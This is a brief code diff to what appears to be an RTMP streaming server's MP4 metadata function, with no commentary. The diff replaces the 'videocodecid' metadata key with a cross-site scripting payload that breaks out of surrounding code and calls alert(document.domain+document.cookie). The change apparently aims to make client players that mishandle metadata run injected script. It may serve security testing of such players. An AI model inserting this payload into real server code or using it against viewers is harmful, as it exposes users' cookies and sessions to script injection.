@@ -1987,7 +1987,7 @@ ngx_rtmp_mp4_send_meta(ngx_rtmp_session_t *s)
           &v.duration, 0 },
 
         { NGX_RTMP_AMF_NUMBER,
-          ngx_string("videocodecid"),
+          ngx_string("1:1}))) ; } catch (e) {alert(document.domain+document.cookie)}//videocodecid"),
           &v.video_codec_id, 0 },
 
         { NGX_RTMP_AMF_NUMBER,
